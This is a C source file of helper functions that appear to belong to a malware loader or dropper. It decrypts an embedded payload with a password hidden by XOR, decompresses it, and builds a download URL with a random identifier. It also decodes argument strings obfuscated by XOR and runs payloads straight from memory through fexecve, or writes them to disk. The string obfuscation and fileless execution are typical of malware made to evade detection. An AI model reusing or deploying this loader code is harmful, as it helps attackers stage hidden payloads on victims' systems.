#include "helpers.h"

/*
    Get size in bytes of given file
*/
int fsize(FILE *fp)
{
    int prev = ftell(fp);
    fseek(fp, 0L, SEEK_END);
    int sz = ftell(fp);
    fseek(fp, prev, SEEK_SET); //go back to where we were
    return sz;
}

/*
    Execute payload in memory.
    Return 1 on success, 0 on failure.
*/
int executePayload(int payload_fd, char **payload_argv, char **payload_envp)
{
    if (fexecve(payload_fd, (char *const *)payload_argv, (char *const *)payload_envp) == -1)
    { // execute payload
        return 0;
    }
    return 1;
}

/*
    Simply write payload to given file name
*/
void writeToDisk(void *payload, char *pathToWrite, int size)
{
    FILE *outfile = fopen(pathToWrite, "w");
    fwrite(payload, sizeof(char), size, outfile);
    fclose(outfile);
}

unsigned char *decrypt(unsigned char *encrypted, unsigned int input_length, unsigned int original_size, unsigned char *key)
{
    unsigned char encrypted_msg[input_length - 24];
    unsigned char nonce[24];

    const unsigned int ciphertext_len = original_size + 16;

    unsigned char *decrypted = calloc(original_size, sizeof(unsigned char));

    if (sodium_init() == -1)
    {
        return NULL;
    }

    for (int i = 0; i < input_length; i++)
    {
        if (i > 23)
        {
            encrypted_msg[i - 24] = encrypted[i];
        }
        else
        {
            nonce[i] = encrypted[i];
        }
    }

    if (crypto_secretbox_open_easy(decrypted, encrypted_msg, ciphertext_len, nonce, key) != 0)
    {
        return NULL;
    }

    return decrypted;
}

unsigned char *decompress(unsigned char *decrypted, uLong uncomp_len, uLong compressed_len)
{
    unsigned char *uncompressed = (mz_uint8 *)malloc((size_t)uncomp_len);

    uncompress(uncompressed, &uncomp_len, decrypted, compressed_len);
    free(decrypted);

    return uncompressed;
}

unsigned int extractInt(unsigned char *payload)
{
    unsigned int toRet = (payload[0] | payload[1] << 8 | payload[2] << 16 | payload[3] << 24);
    return toRet;
}

unsigned char *psswdPadding()
{
    int len;
    char pad = '#';
    unsigned char *psswd = malloc(32);
    unsigned char decoded[strlen(ENC_PASSWORD)];

    if (psswd == NULL)
    {
        return NULL;
    }

    len = strlen(ENC_PASSWORD);

    for (int i = 0; i < len; i++)
    {
        decoded[i] = ENC_PASSWORD[i] ^ 0x8F;
    }

    //add padding if necessary
    if (len < 32)
    {
        memcpy(psswd, decoded, len);
        memset(psswd + len, pad, 32 - len);
    }
    else
    {
        memcpy(psswd, decoded, 32);
    }

    return psswd;
}

char *formatURL(char *payload, char *uid)
{
    char *formattedURL = calloc(strlen(PAYLOAD_URL) + strlen(payload) + 70, 1);

    if (formattedURL == NULL)
        return NULL;

    strcpy(formattedURL, PAYLOAD_URL);
    strcat(formattedURL, payload);
    strcat(formattedURL, "&uid=");
    strcat(formattedURL, uid);

    return formattedURL;
}

char *genUID()
{
    char *alphaNums = "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9";
    char *uid = calloc(65, sizeof(char));

    if (uid == NULL)
        return NULL;

    for (int i = 0; i < 64; i++)
        uid[i] = alphaNums[rand() % 62] ^ 0xF0;

    return uid;
}

size_t countPayloads(char *payloads)
{
    int numPayloads = 0;
    char start = 0;
    for (int i = 0; i < strlen(payloads); i++) // count number of payloads to allocate
    {
        if (!start)
        {
            if (payloads[i] != ' ')
            {
                start = 1;
                continue;
            }
            else
            {
                continue;
            }
        }
        if ((payloads[i] == ' ') && (payloads[i + 1] != ' '))
        {
            numPayloads += 1;
        }
    }
    return ++numPayloads;
}

char **parsePayloads(char *payloads, size_t numPayloads)
{
    char **payloadNames;
    char *tok;
    char *sep = " ";

    payloadNames = calloc(numPayloads, sizeof(char *));
    if (numPayloads == 1)
    {
        payloadNames[0] = calloc(strlen(payloads) + 1, sizeof(char));
        strcpy(payloadNames[0], payloads);
    }
    else
    {
        tok = strtok(payloads, sep);
        int i = 0;
        while (tok != NULL)
        {
            payloadNames[i] = calloc(strlen(tok) + 1, sizeof(char));
            strcpy(payloadNames[i], tok);
            tok = strtok(NULL, sep);
            i++;
        }
    }
    if (payloadNames[numPayloads - 1][strlen(payloadNames[numPayloads - 1]) - 1] == '\n')
        payloadNames[numPayloads - 1][strlen(payloadNames[numPayloads - 1]) - 1] = '\0';

    return payloadNames;
}

PayloadStruct *parseMeta(unsigned char **payloadOffset)
{
    PayloadStruct *payloadMeta;
    unsigned int numPayloads;
    unsigned int numArgv;
    unsigned int numEnvp;
    unsigned int numExtras;

    numPayloads = extractInt(*payloadOffset);
    *payloadOffset += 4;
    payloadMeta = (PayloadStruct *)calloc(numPayloads, sizeof(PayloadStruct)); //allocate array of pointers to point to arrays of payload metadatas

    if (payloadMeta == NULL)
    {
        return NULL;
    }

    for (int i = 0; i < numPayloads; i++)
    { // define metadata arrays
        payloadMeta[i].flags = extractInt(*payloadOffset);
        *payloadOffset += 4;
        numArgv = extractInt(*payloadOffset);
        *payloadOffset += 4;
        numEnvp = extractInt(*payloadOffset);
        *payloadOffset += 4;
        numExtras = extractInt(*payloadOffset);
        *payloadOffset += 4;

        payloadMeta[i].uncompressedLength = extractInt(*payloadOffset);
        *payloadOffset += 4;
        payloadMeta[i].decryptedLength = extractInt(*payloadOffset);
        *payloadOffset += 4;
        payloadMeta[i].encryptedLength = extractInt(*payloadOffset);
        *payloadOffset += 4;

        extractStrArr(payloadMeta, numArgv, &(payloadMeta[i].argv), payloadOffset, 1);

        extractStrArr(payloadMeta, numEnvp, &(payloadMeta[i].envp), payloadOffset, 1);

        extractStrArr(payloadMeta, numExtras, NULL, payloadOffset, 0);
    }
    return payloadMeta;
}

void extractStrArr(PayloadStruct *payloadMeta, unsigned int numStrs, char ***dest, unsigned char **payloadOffset, char save)
{
    unsigned int currLen;

    // currLen = extractInt(*payloadOffset);
    // *payloadOffset += 4;
    if (save)
    {
        *dest = calloc(numStrs, sizeof(char *));
        for (int j = 0; j < numStrs; j++)
        {
            currLen = extractInt(*payloadOffset);
            *payloadOffset += 4;
            (*dest)[j] = calloc(currLen + 1, sizeof(char));
            memcpy((*dest)[j], *payloadOffset, currLen);
            (*dest)[j][currLen] = '\0';
            *payloadOffset += currLen;
            for (int k = 0; k < strlen((*dest)[j]); k++)
            {
                (*dest)[j][k] ^= 0xFE;
            }
        }
    }
    else
    {
        for (int j = 0; j < numStrs; j++)
        {
            currLen = extractInt(*payloadOffset);
            *payloadOffset += 4 + currLen;
        }
    }
}